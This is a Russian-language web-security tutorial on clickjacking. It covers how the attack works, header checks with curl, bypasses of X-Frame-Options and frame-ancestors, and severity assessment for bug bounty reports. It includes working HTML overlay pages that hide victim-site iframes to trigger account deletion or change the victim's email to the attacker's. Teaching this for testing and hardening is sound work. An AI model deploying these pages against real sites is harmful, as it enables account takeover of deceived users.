Clickjacking (UI-redressing) — это атака, при которой злоумышленник накладывает невидимый iframe с целевым сайтом поверх своей страницы и заставляет жертву кликать по «своим» кнопкам, которые на самом деле нажимают кнопки на чужом сайте. Технически это обман пользователя, а не взлом сервера, но последствия могут быть серьёзными: удаление аккаунта, перевод денег, изменение настроек приватности, подписка. Этот урок — про то, как искать clickjacking и как его эксплуатировать.

## Как работает clickjacking

Атакующий создаёт страницу с iframe, указывающим на цель, делает iframe прозрачным или позиционирует так, чтобы нужная кнопка оказалась под «приманкой», и добавляет свой видимый элемент (кнопку «Получить приз»). Жертва кликает по приманке — клик уходит в iframe.

```html
<style>
  iframe { position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.0001; z-index:2; }
  .bait { position:absolute; top:200px; left:100px; z-index:1; }
</style>
<iframe src="https://victim.com/settings/delete-account"></iframe>
<button class="bait">Нажмите, чтобы продолжить</button>
```

Прозрачность (`opacity:0.0001`, а не `0`, чтобы клики регистрировались), позиционирование и `z-index` — ключевые детали.

## Варианты: clickjacking, likejacking, cursorjacking

Помимо классики, есть вариации. **Likejacking** — клик по «Мне нравится» в соцсети. **Cursorjacking** — подмена курсора, чтобы жертва кликала не туда, куда указывает мышь. **Filejacking** — обман на выбор файла. **Clickjacking с drag&drop** — перетаскивание. **Tabjacking** — комбинация с tabnabbing.

## Проверка: уязвим ли сайт

Сайт уязвим, если его можно встроить в iframe. Проверяется заголовками и CSP.

```bash
# смотрим защитные заголовки
curl -sI https://victim.com/settings | grep -iE 'x-frame-options|content-security-policy'
# X-Frame-Options: DENY или SAMEORIGIN -> защищён от embedding
# CSP: frame-ancestors 'none' / 'self' -> защищён
# отсутствие обоих -> уязвим
```

| Заголовок | Значение | Эффект |
|-----------|----------|--------|
| `X-Frame-Options` | `DENY` | нельзя встроить нигде |
| `X-Frame-Options` | `SAMEORIGIN` | только свой origin |
| `X-Frame-Options` | `ALLOW-FROM` | устарел, не поддерживается |
| `CSP: frame-ancestors` | `'none'` | нельзя встроить |
| `CSP: frame-ancestors` | `'self'` | только свой origin |
| CSP с `frame-ancestors` | список доменов | только перечисленные |

Важно: если задан только `X-Frame-Options: SAMEORIGIN`, но не `frame-ancestors`, защита может быть обойдена в браузерах, которые приоритизируют CSP (если CSP разрешает). И наоборот. Проверяйте оба.

## Обход защит

Даже при наличии заголовков остаются векторы. Во-первых, **неправильная CSP**: если `frame-ancestors` не указан, а `X-Frame-Options` отдаётся не всегда (например, только для некоторых ответов), embedding возможен. Во-вторых, **двойной фрейминг**: если страница защищена `SAMEORIGIN`, но имеет XSS/HTML-инъекцию, можно встроить её через промежуточный документ на том же origin. В-третьих, **sandbox-iframe** может обходить некоторые проверки. В-четвёртых, **устаревшие браузеры** игнорируют часть заголовков.

```html
<!-- обход SAMEORIGIN через промежуточный документ на том же origin -->
<!-- если на victim.com есть HTML-инъекция или открытый редирект -->
<iframe src="https://victim.com/redirect?to=/settings"></iframe>
```

## Разобранный пример: clickjacking на смене email

```bash
# 1. проверяем заголовки
$ curl -sI https://victim.com/account/email | grep -iE 'x-frame-options|frame-ancestors'
(нет ни одного)          # уязвим

# 2. смотрим форму смены email
$ curl -s https://victim.com/account/email | grep -oE '<input[^>]+name="[^"]+"'
<input name="email" ...>
<input name="csrf" ...>

# 3. строим clickjacking-страницу: две наложенные цели
#    (первый iframe — ввод атакующего email, второй — submit)
cat > cj.html <<'HTML'
<style>
 iframe{position:absolute;opacity:0.0001;width:1200px;height:800px;border:0}
 #f1{top:-300px;left:-200px}   /* подгоняем поле email под приманку */
 #f2{top:-500px;left:-200px}   /* подгоняем кнопку submit */
 .bait{position:absolute;z-index:1}
</style>
<iframe id=f1 src="https://victim.com/account/email"></iframe>
<iframe id=f2 src="https://victim.com/account/email"></iframe>
<button class=bait style="top:200px;left:100px">Выиграть приз</button>
HTML
```

На практике для авто-заполнения поля email используют `#`-фрагменты или предзаполнение, а для двух шагов — несколько кликов. Артефакт — email жертвы изменён на адрес атакующего (и далее сброс пароля → захват аккаунта).

## Разобранный пример: подтверждение уязвимости

Минимальное доказательство — страница, которая встраивает цель и показывает, что клик по приманке активирует действие.

```bash
# 1. цель без защиты
$ curl -sI https://victim.com/action | grep -c -iE 'x-frame-options|frame-ancestors'
0
# 2. создаём тестовую страницу и открываем в браузере
cat > test.html <<'HTML'
<iframe src="https://victim.com/action" width="800" height="600"></iframe>
HTML
# если в iframe отображается функциональность -> embedding разрешён
```

## Крайние случаи и подводные камни

- **`opacity:0`** иногда не регистрирует клики — используйте `0.0001` или `filter`.
- **`sandbox` без `allow-forms`** блокирует отправку формы — учитывайте.
- **Двухшаговые действия** (ввод email → подтверждение) требуют нескольких приманок.
- **CSRF-токен** не защищает от clickjacking: клик идёт с сессией жертвы и валидным токеном.
- **`frame-ancestors` без `X-Frame-Options`** защищает в современных браузерах.
- **`ALLOW-FROM`** не работает в Chrome — не считайте его защитой.

## Что делать дальше / решение

1. **Проверьте заголовки** — `X-Frame-Options` и `frame-ancestors`.
2. **Проверьте embedding** — откройте цель в iframe на своей странице.
3. **Определите чувствительное действие** — смена email/пароля, удаление, перевод.
4. **Постройте PoC** — наложенный iframe + приманка.
5. **Подтвердите** — действие выполнилось с сессией жертвы.
6. **Проверьте обходы** — если защита есть, ищите неполную CSP или HTML-инъекцию.
7. **Тупик** — переходите к CSRF и tabnabbing.

## Глубже: почему заголовки не всегда спасают

Даже наличие защитных заголовков не гарантирует безопасность, потому что они применяются непоследовательно. Во-первых, заголовки могут отсутствовать на части ответов: разработчик добавил их в основной роутер, но забыл про API, статику или error-страницы. Во-вторых, `X-Frame-Options` и `frame-ancestors` могут конфликтовать: если CSP задан с `frame-ancestors *` (или без директивы), а `XFO: SAMEORIGIN`, поведение зависит от браузера. В-третьих, защита может быть на уровне приложения, а не ответа, и обходится при определённых условиях (кеш, редирект, вложенные документы).

Особенно коварен **двойной фрейминг**: если целевая страница защищена `SAMEORIGIN`, её нельзя встроить с чужого origin. Но если на том же origin есть любая страница, которую можно встроить (или открытый редирект, или HTML-инъекция), атакующий строит цепочку: чужой iframe → промежуточная страница на victim.com → целевая страница. Иногда браузер считает, что оба документа одного origin, и защита не срабатывает. Это редкий, но реальный обход, который стоит проверять при наличии XSS/редиректа на целевом домене.

## Глубже: оценка серьёзности

Clickjacking оценивают по чувствительности действия, которое удаётся «накликать». Изменение email с последующим сбросом пароля — критично (полный захват аккаунта). Удаление аккаунта, перевод денег, изменение прав — критично/высоко. Изменение настроек приватности, подписка, лайк — средне/низко. Дополнительный фактор — требует ли действие нескольких шагов (тогда нужен многошаговый PoC) и есть ли на странице подтверждение/капча (усложняет).

Важно правильно оформить PoC: он должен работать в браузере, наглядно показывать наложение и приводить к наблюдаемому эффекту. Скриншот/видео сработавшей атаки — сильное доказательство. Если действие двухшаговое, покажите оба шага.

## Итог и типичные ошибки

Главная ошибка — считать clickjacking «неважным» и не проверять его. Между тем в баг-баунти за накликанное чувствительное действие платят хорошо, особенно если оно ведёт к захвату аккаунта. Вторая ошибка — проверять только главную страницу и не смотреть API/настройки. Третья — игнорировать обходы, когда защита есть. Четвёртая — делать PoC, который не воспроизводится в реальном браузере (например, `opacity:0` вместо `0.0001`). Пятая — забывать, что `frame-ancestors` важнее `X-Frame-Options` в современных браузерах.

## Чек-лист тестирования clickjacking

Начните с инвентаризации чувствительных действий: смена email/пароля, удаление аккаунта, перевод денег, изменение прав, подписка, подтверждение платежа. Для каждого откройте страницу и проверьте заголовки `X-Frame-Options` и `frame-ancestors`. Если защиты нет — сразу создайте тестовую HTML-страницу с iframe и убедитесь, что функциональность отображается и кликабельна. Затем постройте PoC с наложением: прозрачный iframe и приманка, позиционированные так, чтобы клик попадал в нужную кнопку. Для двухшаговых действий используйте два iframe и несколько кликов. Проверьте, что PoC работает в реальном браузере (не только в теории), и снимите доказательство (скриншот/видео). Если защита есть — проверьте обходы: отсутствие `frame-ancestors` при наличии только `XFO`, непоследовательные заголовки, двойной фрейминг через HTML-инъекцию/редирект. Оцените серьёзность по последствиям действия и оформите отчёт с точным PoC.

Помните: clickjacking — это про обман пользователя, и он остаётся эффективным, потому что пользователь видит «свою» страницу и не подозревает о наложении. Именно поэтому даже простые приманки («подтвердите, что вы человек») работают на реальных людях.

## Где пригодится

- **CTF (Web):** clickjacking встречается в задачах про UI и иногда в связке с CSRF.
- **Bug bounty:** фрейминг чувствительных страниц (оплата, настройки, удаление) — валидная находка.
- **Пентест:** проверка заголовков фрейминга — обязательный пункт чек-листа.
- **Работа (AppSec/Dev):** настройка `frame-ancestors` в CSP — часть базового харденинга веб-приложения.
